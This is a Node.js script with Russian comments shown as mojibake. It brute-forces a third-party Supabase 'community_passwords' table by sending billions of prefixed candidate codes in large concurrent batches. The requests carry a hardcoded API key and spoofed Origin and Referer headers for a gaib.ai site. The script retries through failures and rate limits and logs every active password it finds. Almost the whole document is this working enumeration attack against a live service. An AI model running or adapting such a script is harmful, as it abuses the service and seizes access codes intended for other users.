const axios = require('axios');
const fs = require('fs');
const path = require('path');
const pLimit = require('p-limit').default;
const readline = require('readline');

// --- –û–°–ù–û–í–ù–´–ï –ù–ê–°–¢–†–û–ô–ö–ò ---
const PREFIX = 'Aethir';
const BASE_API_URL = 'https://nhiymxlnmxrvcefwpdbg.supabase.co/rest/v1/community_passwords';
const CODE_PARAMETER_NAME = 'password';
const CODES_FILE_NAME = 'all_codes_go_parallel.txt';
const RESULTS_FILE_NAME = 'result.txt';
const BATCH_SIZE = 950;
const CONCURRENCY_LIMIT = 120;
const HIGH_WATER_MARK = CONCURRENCY_LIMIT * 2;
const PROGRESS_INTERVAL_MS = 10000; // 10 —Å–µ–∫—É–Ω–¥

// --- –ù–ê–°–¢–†–û–ô–ö–ê –ü–ï–†–ï–ó–ê–ü–£–°–ö–ê ---
const START_FROM_BATCH =  1502945; // –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ 1 –¥–ª—è –æ–±—ã—á–Ω–æ–≥–æ –∑–∞–ø—É—Å–∫–∞. –î–ª—è –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞ —É–∫–∞–∂–∏—Ç–µ –Ω–æ–º–µ—Ä –ø–∞–∫–µ—Ç–∞.

// --- –ù–û–í–´–ï –ù–ê–°–¢–†–û–ô–ö–ò –û–¢–ö–ê–ó–û–£–°–¢–û–ô–ß–ò–í–û–°–¢–ò ---
const RETRY_ATTEMPTS_BEFORE_SLEEP = 2; // –ö–æ–ª-–≤–æ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö –æ—à–∏–±–æ–∫ –ø–µ—Ä–µ–¥ —É—Ö–æ–¥–æ–º –≤ —Å–ø—è—â–∏–π —Ä–µ–∂–∏–º
const SLEEP_ON_FAIL_MINUTES = 60;     // –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å —Å–ø—è—â–µ–≥–æ —Ä–µ–∂–∏–º–∞ –≤ –º–∏–Ω—É—Ç–∞—Ö
const SHORT_RETRY_DELAY_MS = 5000;    // –ö–æ—Ä–æ—Ç–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –ø–µ—Ä–µ–¥ –æ–±—ã—á–Ω–æ–π –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–æ–π (–≤ –º—Å)

// --- –ì–õ–û–ë–ê–õ–¨–ù–´–ï –ü–ï–†–ï–ú–ï–ù–ù–´–ï –°–û–°–¢–û–Ø–ù–ò–Ø ---
let consecutiveFailures = 0; // –°—á–µ—Ç—á–∏–∫ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö –æ—à–∏–±–æ–∫

// --- –£–¢–ò–õ–ò–¢–´ ---
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function checkCodeBatch(batch, batchNum) {
    const filterValue = `in.(${batch.join(',')})`;
    try {
        const params = { select: 'id,max_uses,current_uses,active,password', [CODE_PARAMETER_NAME]: filterValue, active: 'eq.true' };
        const headers = { 'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oaXlteGxubXhydmNlZndwZGJnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg1MjMyNzMsImV4cCI6MjA2NDA5OTI3M30.joedN9gZhp4sxCXOCC5Xe7wHCg-uod683Qh84D78NO8', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oaXlteGxubXhydmNlZndwZGJnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg1MjMyNzMsImV4cCI6MjA2NDA5OTI3M30.joedN9gZhp4sxCXOCC5Xe7wHCg-uod683Qh84D78NO8', 'Accept': 'application/json', 'Origin': 'https://fremenessence.gaib.ai', 'Referer': 'https://fremenessence.gaib.ai/' };
        
        // –£–±–∏—Ä–∞–µ–º –ª–æ–≥ –æ—Ç—Å—é–¥–∞, —á—Ç–æ–±—ã –Ω–µ –¥—É–±–ª–∏—Ä–æ–≤–∞—Ç—å –ø—Ä–∏ –ø–æ–≤—Ç–æ—Ä–Ω—ã—Ö –ø–æ–ø—ã—Ç–∫–∞—Ö
        // console.log(`[–ü–∞–∫–µ—Ç ${batchNum}] –û—Ç–ø—Ä–∞–≤–ª—è–µ–º ${batch.length} –∫–æ–¥–æ–≤...`);
        const response = await axios.get(BASE_API_URL, { params, headers, timeout: 60000 });
        
        return { status: 'success', validCodes: response.data, batchNum };
    } catch (error) {
        let errorMessage = `[–ü–∞–∫–µ—Ç ${batchNum}] ‚ùóÔ∏è –û—à–∏–±–∫–∞: `;
        if (error.code) errorMessage += `${error.code} `;
        if (error.response) errorMessage += `API Error ${error.response.status}`;
        else if (error.request) errorMessage += 'Network Error / Timeout';
        else errorMessage += error.message;

        return { status: 'exception', message: errorMessage, batchNum };
    }
}

function processAndLogResult(result, writeStream, stats) {
    // –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è —Ç–µ–ø–µ—Ä—å –ø—Ä–æ—Å—Ç–æ –ª–æ–≥–≥–∏—Ä—É–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç, –Ω–µ —É–ø—Ä–∞–≤–ª—è—è –ª–æ–≥–∏–∫–æ–π –æ—à–∏–±–æ–∫
    if (result.status === 'success') {
        stats.successfulBatches++;
        if (result.validCodes.length > 0) {
            stats.totalValidCount += result.validCodes.length;
            console.log(`[–ü–∞–∫–µ—Ç ${result.batchNum}] ‚úÖ –£—Å–ø–µ—Ö! –ù–∞–π–¥–µ–Ω–æ –í–ê–õ–ò–î–ù–´–• –∫–æ–¥–æ–≤: ${result.validCodes.length} —à—Ç.`);
            const logData = result.validCodes.map(item => `[${new Date().toLocaleTimeString('uk-UA')}] –ö–æ–¥: ${item.password.padEnd(15)} | –°—Ç–∞—Ç—É—Å: valid | –î–∞–Ω–Ω—ã–µ: ${JSON.stringify(item)}`).join('\n');
            writeStream.write(logData + '\n');
        }
    } else {
        // –ü—Ä–æ—Å—Ç–æ –≤—ã–≤–æ–¥–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ. –°—á–µ—Ç—á–∏–∫ `failedBatches` –±–æ–ª—å—à–µ –Ω–µ –Ω—É–∂–µ–Ω,
        // —Ç–∞–∫ –∫–∞–∫ –º—ã –±—É–¥–µ–º –ø–æ–≤—Ç–æ—Ä—è—Ç—å –∑–∞–ø—Ä–æ—Å –¥–æ —É—Å–ø–µ—Ö–∞.
        console.error(result.message);
        writeStream.write(`[${new Date().toLocaleTimeString('uk-UA')}] ${result.message}\n`);
    }
}


/**
 * –ù–û–í–ê–Ø –§–£–ù–ö–¶–ò–Ø: –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –ø–∞–∫–µ—Ç —Å –ª–æ–≥–∏–∫–æ–π –ø–æ–≤—Ç–æ—Ä–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫ –∏ —Å–Ω–∞.
 * –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –±—É–¥–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å—Å—è –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–∞–∫–µ—Ç–∞.
 */
async function processBatchWithRetries(batch, batchNum, writeStream, stats) {
    console.log(`[–ü–∞–∫–µ—Ç ${batchNum}] –ù–∞—á–∏–Ω–∞–µ–º –æ–±—Ä–∞–±–æ—Ç–∫—É ${batch.length} –∫–æ–¥–æ–≤... (–ê–∫—Ç–∏–≤–Ω–æ: ${limit.activeCount}, –í –æ—á–µ—Ä–µ–¥–∏: ${limit.pendingCount})`);
    
    while (true) { // –ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ—Ä–≤–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
        const result = await checkCodeBatch(batch, batchNum);

        if (result.status === 'success') {
            // –ï—Å–ª–∏ –∑–∞–ø—Ä–æ—Å —É—Å–ø–µ—à–µ–Ω
            if (consecutiveFailures > 0) {
                console.log(`[–°–ò–°–¢–ï–ú–ê] ‚úÖ API —Å–Ω–æ–≤–∞ –≤ —Å—Ç—Ä–æ—é! –í–æ–∑–æ–±–Ω–æ–≤–ª—è–µ–º –Ω–æ—Ä–º–∞–ª—å–Ω—É—é —Ä–∞–±–æ—Ç—É.`);
                consecutiveFailures = 0; // –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫
            }
            processAndLogResult(result, writeStream, stats);
            return; // –í—ã—Ö–æ–¥–∏–º –∏–∑ —Ü–∏–∫–ª–∞ –∏ –∑–∞–≤–µ—Ä—à–∞–µ–º —Ñ—É–Ω–∫—Ü–∏—é
        }

        // --- –ï—Å–ª–∏ –º—ã –∑–¥–µ—Å—å, –∑–Ω–∞—á–∏—Ç –ø—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ ---
        consecutiveFailures++;
        processAndLogResult(result, writeStream, stats); // –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± –æ—à–∏–±–∫–µ –≤ —Ñ–∞–π–ª

        if (consecutiveFailures >= RETRY_ATTEMPTS_BEFORE_SLEEP) {
            // –î–æ—Å—Ç–∏–≥–Ω—É—Ç –ø–æ—Ä–æ–≥ –æ—à–∏–±–æ–∫, —É—Ö–æ–¥–∏–º –≤ –¥–ª–∏—Ç–µ–ª—å–Ω—ã–π —Å–æ–Ω
            const sleepDurationMs = SLEEP_ON_FAIL_MINUTES * 60 * 1000;
            console.error(`[–ü–ê–£–ó–ê] üî¥ –û–±–Ω–∞—Ä—É–∂–µ–Ω–æ ${consecutiveFailures} –æ—à–∏–±–æ–∫ –ø–æ–¥—Ä—è–¥. –°–∫—Ä–∏–ø—Ç —É—Ö–æ–¥–∏—Ç –≤ —Å–ø—è—â–∏–π —Ä–µ–∂–∏–º –Ω–∞ ${SLEEP_ON_FAIL_MINUTES} –º–∏–Ω—É—Ç.`);
            console.error(`[–ü–ê–£–ó–ê] üî¥ –í–æ–∑–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã –ø—Ä–∏–º–µ—Ä–Ω–æ –≤ ${new Date(Date.now() + sleepDurationMs).toLocaleTimeString('uk-UA')}`);
            
            await sleep(sleepDurationMs);
            
            console.log(`[–í–û–ó–û–ë–ù–û–í–õ–ï–ù–ò–ï] üü¢ –°–ø—è—â–∏–π —Ä–µ–∂–∏–º –∑–∞–≤–µ—Ä—à–µ–Ω. –ü–æ–≤—Ç–æ—Ä—è–µ–º —Ç–æ—Ç –∂–µ –ø–∞–∫–µ—Ç ‚Ññ${batchNum}...`);
            consecutiveFailures = 0; // –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ –ø–æ—Å–ª–µ –¥–æ–ª–≥–æ–π –ø–∞—É–∑—ã, —á—Ç–æ–±—ã –¥–∞—Ç—å —Å–∏—Å—Ç–µ–º–µ —à–∞–Ω—Å
        } else {
            // –û—à–∏–±–æ–∫ –µ—â–µ –Ω–µ —Ç–∞–∫ –º–Ω–æ–≥–æ, –¥–µ–ª–∞–µ–º –∫–æ—Ä–æ—Ç–∫—É—é –ø–∞—É–∑—É –∏ –ø–æ–≤—Ç–æ—Ä—è–µ–º
            console.warn(`[–ü–û–í–¢–û–†] ‚ö†Ô∏è –û—à–∏–±–∫–∞ –≤ –ø–∞–∫–µ—Ç–µ ‚Ññ${batchNum}. –ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ ${SHORT_RETRY_DELAY_MS / 1000} —Å–µ–∫... (–ü–æ–ø—ã—Ç–∫–∞ ${consecutiveFailures}/${RETRY_ATTEMPTS_BEFORE_SLEEP})`);
            await sleep(SHORT_RETRY_DELAY_MS);
        }
        // –¶–∏–∫–ª while(true) –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–µ—Ä–µ–π–¥–µ—Ç –∫ —Å–ª–µ–¥—É—é—â–µ–π –∏—Ç–µ—Ä–∞—Ü–∏–∏, –ø–æ–≤—Ç–æ—Ä—è—è –∑–∞–ø—Ä–æ—Å –¥–ª—è –¢–û–ì–û –ñ–ï –ø–∞–∫–µ—Ç–∞.
    }
}


const limit = pLimit(CONCURRENCY_LIMIT);

async function main() {
    console.log("–ó–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞...");
    if (PREFIX) {
        console.log(`–ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ø—Ä–µ—Ñ–∏–∫—Å –¥–ª—è –≤—Å–µ—Ö –∫–æ–¥–æ–≤: "${PREFIX}-"`);
    }

    const codesFilePath = path.join(__dirname, CODES_FILE_NAME);
    if (!fs.existsSync(codesFilePath)) {
        console.error(`–û—à–∏–±–∫–∞: –§–∞–π–ª —Å –∫–æ–¥–∞–º–∏ '${CODES_FILE_NAME}' –Ω–µ –Ω–∞–π–¥–µ–Ω.`);
        return;
    }
    
    const totalLines = 56800000000;
    console.log(`–û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫–æ–¥–æ–≤ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ: ${totalLines.toLocaleString('ru-RU')}`);

    const resultsFilePath = path.join(__dirname, RESULTS_FILE_NAME);
    const resultsStream = fs.createWriteStream(resultsFilePath, { flags: 'a' });
    resultsStream.write(`--- –ó–∞–ø—É—Å–∫/–ø–µ—Ä–µ–∑–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏: ${new Date().toLocaleString('uk-UA')} ---\n`);
    
    console.log(`–†–∞–∑–º–µ—Ä –ø–∞–∫–µ—Ç–∞: ${BATCH_SIZE}, –õ–∏–º–∏—Ç –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤: ${CONCURRENCY_LIMIT}`);
    
    const linesToSkip = START_FROM_BATCH > 1 ? (START_FROM_BATCH - 1) * BATCH_SIZE : 0;
    let batchNum = START_FROM_BATCH;
    // –£–±—Ä–∞–ª–∏ failedBatches, —Ç.–∫. —Ç–µ–ø–µ—Ä—å –º—ã –ø–æ–≤—Ç–æ—Ä—è–µ–º –¥–æ —É—Å–ø–µ—Ö–∞
    const stats = { totalValidCount: 0, linesRead: linesToSkip, successfulBatches: 0 }; 
    
    const fileStream = fs.createReadStream(codesFilePath);
    const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });

    let batch = [];
    let isPaused = false;
    let progressInterval;
    let lineCounterForSkip = 0;
    let skippingPhaseDone = linesToSkip === 0;

    if (linesToSkip > 0) {
        console.log(`\n--- –†–ï–ñ–ò–ú –ü–ï–†–ï–ó–ê–ü–£–°–ö–ê –ê–ö–¢–ò–í–ò–†–û–í–ê–ù ---`);
        console.log(`–ù–∞—á–∏–Ω–∞–µ–º —Å –ø–∞–∫–µ—Ç–∞ ‚Ññ${START_FROM_BATCH.toLocaleString('ru-RU')}.`);
        console.log(`–¢—Ä–µ–±—É–µ—Ç—Å—è –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å ${linesToSkip.toLocaleString('ru-RU')} —Å—Ç—Ä–æ–∫. –≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –≤—Ä–µ–º—è...`);
    }
    
    progressInterval = setInterval(() => {
        const percentage = totalLines > 0 ? ((stats.linesRead / totalLines) * 100).toFixed(8) : "N/A";
        console.log(
            `\n[–ü–†–û–ì–†–ï–°–° | ${new Date().toLocaleTimeString('uk-UA')}] –û–±—Ä–∞–±–æ—Ç–∞–Ω–æ: ${stats.linesRead.toLocaleString('ru-RU')}/${totalLines.toLocaleString('ru-RU')} (${percentage}%) | –ù–∞–π–¥–µ–Ω–æ: ${stats.totalValidCount} | –ó–∞–ø—Ä–æ—Å—ã (–ê–∫—Ç–∏–≤–Ω–æ/–í –æ—á–µ—Ä–µ–¥–∏): ${limit.activeCount}/${limit.pendingCount}\n`
        );
    }, PROGRESS_INTERVAL_MS);

    await new Promise((resolve, reject) => {
        rl.on('line', (line) => {
            if (lineCounterForSkip < linesToSkip) {
                lineCounterForSkip++;
                if (lineCounterForSkip % 1000000 === 0) {
                    console.log(`[–ü—Ä–æ–ø—É—Å–∫...] –ü—Ä–æ—á–∏—Ç–∞–Ω–æ ${lineCounterForSkip.toLocaleString('ru-RU')} –∏–∑ ${linesToSkip.toLocaleString('ru-RU')} —Å—Ç—Ä–æ–∫...`);
                }
                return;
            }
            
            if (!skippingPhaseDone) {
                console.log(`\n--- –ü–†–û–ü–£–°–ö –°–¢–†–û–ö –ó–ê–í–ï–†–®–ï–ù ---`);
                console.log(`–ù–∞—á–∏–Ω–∞–µ–º –æ–±—Ä–∞–±–æ—Ç–∫—É —Å –ø–∞–∫–µ—Ç–∞ ‚Ññ${batchNum.toLocaleString('ru-RU')}.\n`);
                skippingPhaseDone = true;
            }

            stats.linesRead++;
            const rawCode = line.trim();

            if (rawCode) {
                const finalCode = PREFIX ? `${PREFIX}-${rawCode}` : rawCode;
                batch.push(finalCode);
            }
            
            if (batch.length >= BATCH_SIZE) {
                const currentBatch = batch;
                const currentBatchNum = batchNum;
                
                // –ò–ó–ú–ï–ù–ï–ù–ò–ï: –í—ã–∑—ã–≤–∞–µ–º –Ω–æ–≤—É—é —Ñ—É–Ω–∫—Ü–∏—é-–æ–±–µ—Ä—Ç–∫—É
                limit(() => processBatchWithRetries(currentBatch, currentBatchNum, resultsStream, stats))
                    .then(() => {
                        if (isPaused && limit.pendingCount < CONCURRENCY_LIMIT) {
                            isPaused = false;
                            rl.resume();
                        }
                    });

                batch = []; 
                batchNum++;

                if (!isPaused && limit.pendingCount > HIGH_WATER_MARK) {
                    isPaused = true;
                    rl.pause();
                }
            }
        });

        rl.on('close', () => {
            if (batch.length > 0) {
                // –ò–ó–ú–ï–ù–ï–ù–ò–ï: –í—ã–∑—ã–≤–∞–µ–º –Ω–æ–≤—É—é —Ñ—É–Ω–∫—Ü–∏—é-–æ–±–µ—Ä—Ç–∫—É –¥–ª—è –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –ø–∞–∫–µ—Ç–∞
                limit(() => processBatchWithRetries(batch, batchNum, resultsStream, stats));
            }
            console.log(`–ß—Ç–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–æ. –í—Å–µ–≥–æ –ø—Ä–æ—á–∏—Ç–∞–Ω–æ —Å—Ç—Ä–æ–∫: ${stats.linesRead.toLocaleString('ru-RU')}. –û–∂–∏–¥–∞–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—Å–µ—Ö —Å–µ—Ç–µ–≤—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤...`);
            resolve();
        });

        rl.on('error', (err) => {
            clearInterval(progressInterval);
            reject(err);
        });
    });

    await limit.onIdle();
    
    clearInterval(progressInterval);

    resultsStream.end();

    console.log('\n\n--- –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ ---');
    console.log(`–û–±—Ä–∞–±–æ—Ç–∫–∞ ${stats.linesRead.toLocaleString('ru-RU')} —Å—Ç—Ä–æ–∫ –∑–∞–≤–µ—Ä—à–µ–Ω–∞.`);
    // –£–±—Ä–∞–ª–∏ —É–ø–æ–º–∏–Ω–∞–Ω–∏–µ –æ—à–∏–±–æ—á–Ω—ã—Ö –ø–∞–∫–µ—Ç–æ–≤, —Ç–∞–∫ –∫–∞–∫ —Ç–µ–ø–µ—Ä—å –≤—Å–µ –¥–æ–≤–æ–¥—è—Ç—Å—è –¥–æ —É—Å–ø–µ—Ö–∞
    console.log(`–£—Å–ø–µ—à–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã—Ö –ø–∞–∫–µ—Ç–æ–≤: ${stats.successfulBatches}`);
    console.log(`–ù–∞–π–¥–µ–Ω–æ –í–°–ï–ì–û –≤–∞–ª–∏–¥–Ω—ã—Ö –∫–æ–¥–æ–≤: ${stats.totalValidCount}`);
    console.log(`\n–í—Å–µ –ø–æ–¥—Ä–æ–±–Ω—ã–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ —Ñ–∞–π–ª–µ '${RESULTS_FILE_NAME}'.`);
}

main().catch(err => console.error("–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞:", err));